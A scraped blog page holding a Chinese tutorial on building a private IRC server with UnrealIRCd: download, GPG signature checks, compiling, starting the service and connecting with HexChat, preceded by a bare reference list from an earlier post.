<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/13785619.html">https://www.cnblogs.com/LyShark/p/13785619.html</a><br>《黑客免杀攻防》-2013<br>《杀不死的密码》–2010-06<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4191">https://xz.aliyun.com/t/4191</a><br><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-53045-1-1.html">https://bbs.ichunqiu.com/thread-53045-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ssw6/p/12091506.html">https://www.cnblogs.com/ssw6/p/12091506.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107842074">https://blog.csdn.net/qq_41874930/article/details/107842074</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E6%90%AD%E5%BB%BAIRC%E7%A7%81%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/21/%E6%90%AD%E5%BB%BAIRC%E7%A7%81%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="post-title-link" itemprop="url">搭建IRC私有服务器</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-21 19:13:52 / Modified: 23:08:28" itemprop="dateCreated datePublished" datetime="2021-06-21T19:13:52-08:00">2021-06-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="IRC私有聊天室搭建"><a href="#IRC私有聊天室搭建" class="headerlink" title="IRC私有聊天室搭建"></a>IRC私有聊天室搭建</h1><h2 id="搭建unrealircd服务器"><a href="#搭建unrealircd服务器" class="headerlink" title="搭建unrealircd服务器"></a>搭建unrealircd服务器</h2><p>这里以unrealircd为例搭建IRC服务器。</p>
<p><strong>下载</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.unrealircd.org/download/5.2</span><br><span class="line"><span class="meta">#</span><span class="bash"> windows或linux版选其一</span></span><br><span class="line">https://www.unrealircd.org/downloads/unrealircd-5.2.0.1.tar.gz</span><br><span class="line">https://www.unrealircd.org/downloads/unrealircd-5.2.0.1.exe</span><br></pre></td></tr></table></figure>

<p><strong>完整性验证</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver keys.gnupg.net --recv-keys 0xA7A21B0A108FF4A9</span><br><span class="line">gpg --verify unrealircd-5.2.0.1.tar.gz.asc unrealircd-5.2.0.1.tar.gz</span><br><span class="line">gpg --verify unrealircd-5.2.0.1.exe.asc unrealircd-5.2.0.1.exe</span><br></pre></td></tr></table></figure>

<p><strong>编译</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./Config</span><br><span class="line"><span class="meta">#</span><span class="bash">接着是一些选项，默认就好，一路回车，有报错就按照提示解决，最后会要求给出参数用来生成加密证书</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cd ~/unrealircd</span><br><span class="line">cp conf/examples/example.conf conf/unrealircd.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">修改相关参数</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-06-21_104838.png"></p>
<p><strong>运行</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su walrus</span><br><span class="line">./unrealircd start</span><br><span class="line"><span class="meta">#</span><span class="bash">此时对外监听了3个irc连接端口</span></span><br><span class="line"><span class="meta">#</span><span class="bash">6667（明文）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">6697（TLS/SSL）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">6900（TLS/SSL）</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-06-21_105319.png"></p>
<h2 id="HexChat接入IRC服务器"><a href="#HexChat接入IRC服务器" class="headerlink" title="HexChat接入IRC服务器"></a>HexChat接入IRC服务器</h2><p><strong>首次使用配置</strong></p>
<p>菜单(HexChat)=&gt;NetworkList=&gt;网络，新建一个irc网络服务器，配置好网络服务器地址及连接方式，进行连接即可。（如果是是经过TLS/SSL加密的需要勾上SSL加密选项）</p>
<p><img src="https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-06-21_115351.png"></p>
<p>做好以上配置后，关闭页面，即可连接即可。</p>
<p><img src="https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-06-21_142343.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">aplyc1a</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  





</body>
</html>
